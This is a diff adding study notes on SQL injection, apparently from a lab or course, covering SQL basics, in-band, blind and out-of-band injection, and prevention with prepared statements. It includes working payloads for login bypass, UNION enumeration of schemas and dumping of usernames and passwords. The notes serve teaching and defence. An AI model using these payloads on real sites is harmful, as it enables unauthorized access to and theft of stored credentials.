@@ -1907,3 +1907,647 @@ Windows
 whoami
 dir
 timeout 5
+
+
+# SQL Injection (SQLi)
+
+## What is SQL Injection?
+
+**SQL Injection (SQLi)** is a web vulnerability where an attacker inserts malicious SQL code into an application's database query.
+
+It happens when:
+
+* A web app accepts user input
+* The input is not properly validated or sanitized
+* The input is directly included in an SQL query
+
+This can allow attackers to:
+
+* Read private data
+* Modify or delete data
+* Bypass login systems
+* Gain admin access
+* Potentially take over applications
+
+SQLi is one of the most dangerous and oldest web vulnerabilities.
+
+---
+
+# Database Basics
+
+## What is a Database?
+
+A **database** stores organized data electronically.
+
+A **DBMS (Database Management System)** controls databases.
+
+Common relational DBMS:
+
+* MySQL
+* PostgreSQL
+* SQLite
+* Microsoft SQL Server
+* Access
+
+---
+
+# Tables, Columns, and Rows
+
+## Tables
+
+A table stores related information.
+
+Example:
+
+* `users`
+* `products`
+* `orders`
+
+---
+
+## Columns (Fields)
+
+Columns define the type of data stored.
+
+Examples:
+
+* `id`
+* `username`
+* `password`
+
+Common data types:
+
+* Integer
+* String/Text
+* Date
+
+---
+
+## Rows (Records)
+
+Rows contain the actual data.
+
+Example:
+
+| id | username | password |
+| -- | -------- | -------- |
+| 1  | admin    | pass123  |
+
+---
+
+# Relational vs Non-Relational Databases
+
+## Relational Databases
+
+* Use tables, rows, and columns
+* Tables relate using keys
+* Structured format
+
+Examples:
+
+* MySQL
+* PostgreSQL
+
+---
+
+## Non-Relational Databases (NoSQL)
+
+* Flexible structure
+* No fixed tables required
+
+Examples:
+
+* MongoDB
+* Cassandra
+* ElasticSearch
+
+---
+
+# SQL Basics
+
+SQL = **Structured Query Language**
+
+Used to:
+
+* Retrieve data
+* Insert data
+* Update data
+* Delete data
+
+---
+
+# Important SQL Commands
+
+## SELECT
+
+Retrieves data.
+
+```sql
+SELECT * FROM users;
+```
+
+Get specific columns:
+
+```sql
+SELECT username,password FROM users;
+```
+
+---
+
+## WHERE Clause
+
+```sql
+SELECT * FROM users WHERE username='admin';
+```
+
+Conditions:
+
+* `=` equal
+* `!=` not equal
+* `AND`
+* `OR`
+
+Example:
+
+```sql
+SELECT * FROM users 
+WHERE username='admin' AND password='p4ssword';
+```
+
+---
+
+# LIKE Operator
+
+Used for pattern matching.
+
+Starts with:
+
+```sql
+LIKE 'a%'
+```
+
+Ends with:
+
+```sql
+LIKE '%n'
+```
+
+Contains:
+
+```sql
+LIKE '%mi%'
+```
+
+---
+
+# LIMIT
+
+Limits returned rows.
+
+```sql
+SELECT * FROM users LIMIT 1;
+```
+
+Skip rows:
+
+```sql
+LIMIT 1,1
+```
+
+---
+
+# UNION
+
+Combines results from multiple SELECT statements.
+
+```sql
+SELECT name,address FROM customers
+UNION
+SELECT company,address FROM suppliers;
+```
+
+Rules:
+
+* Same number of columns
+* Similar data types
+* Same column order
+
+---
+
+# INSERT
+
+Adds data.
+
+```sql
+INSERT INTO users (username,password)
+VALUES ('bob','password123');
+```
+
+---
+
+# UPDATE
+
+Modifies data.
+
+```sql
+UPDATE users
+SET password='newpass'
+WHERE username='admin';
+```
+
+---
+
+# DELETE
+
+Removes data.
+
+```sql
+DELETE FROM users WHERE username='martin';
+```
+
+Delete all rows:
+
+```sql
+DELETE FROM users;
+```
+
+---
+
+# How SQL Injection Works
+
+Example vulnerable URL:
+
+```text
+https://site.com/blog?id=1
+```
+
+Application query:
+
+```sql
+SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;
+```
+
+---
+
+## Injection Example
+
+URL:
+
+```text
+?id=2;--
+```
+
+Query becomes:
+
+```sql
+SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
+```
+
+`--` comments out the rest of the query.
+
+Result:
+
+* Private article becomes accessible.
+
+---
+
+# Types of SQL Injection
+
+## 1. In-Band SQL Injection
+
+Same communication channel used for:
+
+* Exploitation
+* Receiving results
+
+Most common type.
+
+### Types:
+
+* Error-Based
+* Union-Based
+
+---
+
+# Error-Based SQLi
+
+Uses database error messages.
+
+Example:
+
+```text
+'
+```
+
+If errors appear:
+
+* SQLi likely exists
+
+---
+
+# UNION-Based SQLi
+
+Uses UNION operator to extract data.
+
+Example:
+
+```sql
+0 UNION SELECT 1,2,3
+```
+
+---
+
+# Finding Number of Columns
+
+Try:
+
+```sql
+1 UNION SELECT 1
+```
+
+Then:
+
+```sql
+1 UNION SELECT 1,2
+```
+
+Continue until no error appears.
+
+---
+
+# Useful Enumeration Queries
+
+## Get Database Name
+
+```sql
+0 UNION SELECT 1,2,database()
+```
+
+---
+
+## Get Table Names
+
+```sql
+0 UNION SELECT 1,2,
+group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema='sqli_one'
+```
+
+---
+
+## Get Column Names
+
+```sql
+0 UNION SELECT 1,2,
+group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name='staff_users'
+```
+
+---
+
+## Dump Usernames & Passwords
+
+```sql
+0 UNION SELECT 1,2,
+group_concat(username,':',password)
+FROM staff_users
+```
+
+---
+
+# Blind SQL Injection
+
+No visible database output.
+
+Attacker relies on:
+
+* True/False responses
+* Delays
+* Application behavior
+
+---
+
+# Authentication Bypass
+
+Example payload:
+
+```sql
+' OR 1=1;--
+```
+
+Query becomes:
+
+```sql
+SELECT * FROM users
+WHERE username=''
+AND password=''
+OR 1=1;
+```
+
+Since `1=1` is always true:
+
+* Login bypass succeeds
+
+---
+
+# Boolean-Based Blind SQLi
+
+Application only returns:
+
+* true/false
+* yes/no
+
+Example:
+
+```sql
+admin123' UNION SELECT 1,2,3;--
+```
+
+---
+
+## Database Name Enumeration
+
+```sql
+admin123' UNION SELECT 1,2,3
+WHERE database() LIKE 's%';--
+```
+
+If response = true:
+
+* Database starts with `s`
+
+---
+
+# Time-Based Blind SQLi
+
+Uses delays to confirm injections.
+
+Example:
+
+```sql
+admin123' UNION SELECT SLEEP(5),2;--
+```
+
+If response delays 5 seconds:
+
+* Query worked
+
+---
+
+# Out-of-Band SQL Injection
+
+Uses different channels:
+
+* One to attack
+* Another to receive data
+
+Example:
+
+* HTTP requests
+* DNS requests
+
+Less common.
+
+---
+
+# Useful SQLi Functions
+
+## database()
+
+Returns current database name.
+
+```sql
+SELECT database();
+```
+
+---
+
+## group_concat()
+
+Combines rows into one string.
+
+```sql
+group_concat(username,password)
+```
+
+---
+
+# Common SQLi Payloads
+
+## Authentication Bypass
+
+```sql
+' OR 1=1;--
+```
+
+---
+
+## Comment Operators
+
+```sql
+--
+#
+```
+
+---
+
+## UNION Injection
+
+```sql
+UNION SELECT 1,2,3
+```
+
+---
+
+## Time Delay
+
+```sql
+SLEEP(5)
+```
+
+---
+
+# Prevention / Remediation
+
+## 1. Prepared Statements (Parameterized Queries)
+
+Best defense.
+
+Separates:
+
+* SQL code
+* User data
+
+Safe example concept:
+
+```sql
+SELECT * FROM users WHERE username = ?
+```
+
+---
+
+# 2. Input Validation
+
+Only allow expected input.
+
+Examples:
+
+* Numbers only
+* Remove dangerous characters
+
+---
+
+# 3. Escaping User Input
+
+Escape special characters:
+
+* `'`
+* `"`
+* `\`
+
+Example:
+
+```text
+\'
+```
+
+---
+
+# Dangerous Functions
+
+Languages sometimes execute raw queries directly.
+
+Examples:
+
+* PHP `exec`
+* Dynamic query building
+* Unsanitized concatenation
+
+---
+
+# Important SQLi Concepts
+
+| Concept             | Meaning                 |
+| ------------------- | ----------------------- |
+| SQLi                | Injecting malicious SQL |
+| UNION               | Combines query results  |
+| Blind SQLi          | No direct output        |
+| Boolean-Based       | True/False responses    |
+| Time-Based          | Uses delays             |
+| Error-Based         | Uses DB errors          |
+| Prepared Statements | Safe query method       |
+| Sanitization        | Cleaning user input     |
+
+---
+
+# Key Takeaways
+
+* SQL Injection happens when user input is trusted.
+* SQLi can expose or destroy databases.
+* UNION and error messages help attackers enumerate databases.
+* Blind SQLi uses logic or timing instead of visible results.
+* Prepared statements are the best defense.
+* Input validation and sanitization are critical.
+
